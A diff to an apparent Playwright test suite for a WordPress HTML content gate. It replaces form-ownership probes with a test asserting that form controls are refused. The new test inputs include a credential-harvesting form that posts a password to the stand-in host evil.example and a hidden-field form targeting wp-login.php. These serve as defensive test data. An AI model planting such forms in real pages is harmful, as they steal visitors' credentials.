@@ -175,7 +175,7 @@ test.describe('Layer 3A content predicate — live pins', () => {
     const judged = judge([
       '<div id="top">Top</div><h2 id="title">T</h2><svg aria-labelledby="title"><title id="t2">Logo</title></svg><a href="#top">back to top</a>',
       '<img alt="" src="/a.png" name="forms">',
-      '<form action="/s" name="forms"></form>',
+      '<object type="application/pdf" data="/wp-content/uploads/a.pdf" id="forms"></object>',
     ]);
     expect(judged[0].clauses).toEqual([]);
     expect(judged[1].clauses).toContain('E11');
@@ -217,34 +217,19 @@ test.describe('Layer 3A content predicate — live pins', () => {
     expect(core[1].clauses).toEqual([]);
   });
 
-  test('E11: the live HTML processor\'s form element pointer is readable', async () => {
-    const live = probe({ op: 'form_pointer' });
-    expect({ before: live.before, after: live.after }, `WordPress ${live.wp_version}`).toEqual({ before: false, after: true });
-  });
-
-  test('E11: a form the parser keeps owning (an ignored </form>) is judged as owning its controls', async ({ page }) => {
+  test('Δ5 descoped by the owner (2026-10-05): a form and its controls are refused on the live core', () => {
     const shapes = [
-      '<form action="/s"><select></form></select><input type="text" name="action"></form>',
-      '<form action="/s"><table><tr><td></form></td></tr></table><input type="text" name="action"></form>',
-      '<div><form action="/s"></div><input type="text" name="action">',
+      '<form action="/s"><input type="text" name="q"></form>',
+      '<form action="https://evil.example/x" method="post"><input type="password" name="pw"></form>',
+      '<form action="/wp-login.php"><input type="hidden" name="log" value="a"></form>',
+      '<input type="radio" name="plan" value="a">',
+      '<select name="s"><option>a</option></select>',
+      '<textarea name="t">x</textarea>',
     ];
-    const judged = judge(shapes);
-    for (const j of judged) {
-      expect(j.clauses).toContain('E11');
+    for (const j of judge(shapes)) {
+      expect(j.clauses).toContain('D5');
     }
-    for (const shape of shapes) {
-      await page.setContent(`<!DOCTYPE html><html><body><main>${shape}</main></body></html>`);
-      const owned = await page.evaluate(() => {
-        const input = document.querySelector('input[name="action"]') as HTMLInputElement | null;
-        return !!input && !!input.form && (input.form as any).action === input;
-      });
-      expect(owned, `the browser gives the control a form owner: ${shape}`).toBe(true);
-    }
-    // And the other direction: a control the gate admits has no form owner in the browser.
-    const admitted = '<form action="/s"><svg></svg></form><input type="text" name="action">';
-    expect(judge([admitted])[0].clauses).toEqual([]);
-    await page.setContent(`<!DOCTYPE html><html><body><main>${admitted}</main></body></html>`);
-    expect(await page.evaluate(() => (document.querySelector('input[name="action"]') as HTMLInputElement).form)).toBeNull();
+    expect(judge(['<button popovertarget="p">o</button><div id="p" popover>x</div>'])[0].clauses).toEqual([]);
   });
 
   // [input, sink, expected survivor text (null: a whole-prop loss renders nothing), refused at write]
